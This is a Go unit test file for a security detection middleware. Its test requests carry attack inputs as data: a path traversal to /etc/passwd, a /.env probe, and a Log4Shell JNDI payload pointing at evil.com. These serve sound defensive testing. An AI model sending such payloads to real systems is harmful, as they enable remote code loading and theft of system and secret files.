package middleware

import (
	"context"
	"log/slog"
	"net/http"
	"net/http/httptest"
	"os"
	"strings"
	"testing"

	"github.com/0xsj/firewatch/internal/detection"
	"github.com/0xsj/firewatch/internal/storage"
	"github.com/0xsj/firewatch/internal/storage/models"
)

// mockStore captures saved events.
type mockStore struct {
	events []*models.Event
}

func (m *mockStore) SaveEvent(_ context.Context, e *models.Event) error {
	m.events = append(m.events, e)
	return nil
}

func (m *mockStore) GetEvent(context.Context, string) (*models.Event, error) { return nil, nil }
func (m *mockStore) ListEvents(context.Context, storage.EventFilter) ([]*models.Event, error) {
	return nil, nil
}
func (m *mockStore) CountEvents(context.Context, storage.EventFilter) (int64, error) { return 0, nil }
func (m *mockStore) SaveAttacker(context.Context, *models.Attacker) error            { return nil }
func (m *mockStore) GetAttacker(context.Context, string) (*models.Attacker, error) {
	return nil, nil
}
func (m *mockStore) GetAttackerByIP(context.Context, string) (*models.Attacker, error) {
	return nil, nil
}
func (m *mockStore) ListAttackers(context.Context, storage.AttackerFilter) ([]*models.Attacker, error) {
	return nil, nil
}
func (m *mockStore) SaveCampaign(context.Context, *models.Campaign) error { return nil }
func (m *mockStore) GetCampaign(context.Context, string) (*models.Campaign, error) {
	return nil, nil
}
func (m *mockStore) ListCampaigns(context.Context, storage.CampaignFilter) ([]*models.Campaign, error) {
	return nil, nil
}
func (m *mockStore) SaveIOC(context.Context, *models.IOC) error { return nil }
func (m *mockStore) ListIOCs(context.Context, storage.IOCFilter) ([]*models.IOC, error) {
	return nil, nil
}
func (m *mockStore) UpdateEventLinks(context.Context, string, string, string) error { return nil }
func (m *mockStore) Close() error                                                   { return nil }

func testLogger() *slog.Logger {
	return slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
}

func TestDetectionMiddleware_DetectsPathTraversal(t *testing.T) {
	store := &mockStore{}
	logger := testLogger()
	det := detection.NewDefault(logger)

	handler := Detection(det, store, logger)(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/../../etc/passwd", nil)
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	// The downstream handler should still execute.
	if rec.Code != http.StatusOK {
		t.Errorf("status = %d, want %d", rec.Code, http.StatusOK)
	}

	// A detection event should have been saved.
	if len(store.events) == 0 {
		t.Fatal("expected detection event to be saved")
	}

	e := store.events[0]
	if e.Module != "detection" {
		t.Errorf("module = %q, want detection", e.Module)
	}
	if e.Severity == "" {
		t.Error("severity is empty")
	}
}

func TestDetectionMiddleware_DetectsEnvProbe(t *testing.T) {
	store := &mockStore{}
	logger := testLogger()
	det := detection.NewDefault(logger)

	handler := Detection(det, store, logger)(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/.env", nil)
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if len(store.events) == 0 {
		t.Fatal("expected detection event for /.env")
	}

	// Should match exposure-env signature.
	found := false
	for _, sig := range store.events[0].Signatures {
		if strings.Contains(sig, "exposure-env") || strings.Contains(sig, "recon-sweep") {
			found = true
			break
		}
	}
	if !found {
		t.Errorf("signatures = %v, expected env-related signature", store.events[0].Signatures)
	}
}

func TestDetectionMiddleware_NoMatchPassesThrough(t *testing.T) {
	store := &mockStore{}
	logger := testLogger()
	det := detection.NewDefault(logger)

	called := false
	handler := Detection(det, store, logger)(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		called = true
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/index.html", nil)
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if !called {
		t.Error("downstream handler was not called")
	}
	if len(store.events) != 0 {
		t.Errorf("expected no events for /index.html, got %d", len(store.events))
	}
}

func TestDetectionMiddleware_BuffersBodyForDownstream(t *testing.T) {
	store := &mockStore{}
	logger := testLogger()
	det := detection.NewDefault(logger)

	var gotBody string
	handler := Detection(det, store, logger)(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		buf := make([]byte, 1024)
		n, _ := r.Body.Read(buf)
		gotBody = string(buf[:n])
		w.WriteHeader(http.StatusOK)
	}))

	body := `{"test":"data"}`
	req := httptest.NewRequest(http.MethodPost, "/api/test", strings.NewReader(body))
	req.Header.Set("Content-Type", "application/json")
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if gotBody != body {
		t.Errorf("downstream body = %q, want %q", gotBody, body)
	}
}

func TestDetectionMiddleware_Log4ShellInUserAgent(t *testing.T) {
	store := &mockStore{}
	logger := testLogger()
	det := detection.NewDefault(logger)

	handler := Detection(det, store, logger)(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		w.WriteHeader(http.StatusOK)
	}))

	req := httptest.NewRequest(http.MethodGet, "/", nil)
	req.Header.Set("User-Agent", "${jndi:ldap://evil.com/a}")
	rec := httptest.NewRecorder()
	handler.ServeHTTP(rec, req)

	if len(store.events) == 0 {
		t.Fatal("expected detection event for Log4Shell UA")
	}
	if store.events[0].Severity != "critical" {
		t.Errorf("severity = %q, want critical", store.events[0].Severity)
	}
}
